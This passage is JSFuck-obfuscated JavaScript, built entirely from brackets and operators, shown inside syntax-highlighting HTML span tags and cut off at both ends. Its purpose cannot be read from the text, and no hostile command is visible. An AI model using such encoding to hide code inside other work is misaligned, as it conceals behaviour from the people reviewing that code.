class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>((!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(+<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(+(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>))<span class="hljs-comment">[(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+((+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>]</span>(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>)()(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>((+((+(+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>)+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>)+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>)+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>)()())<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span 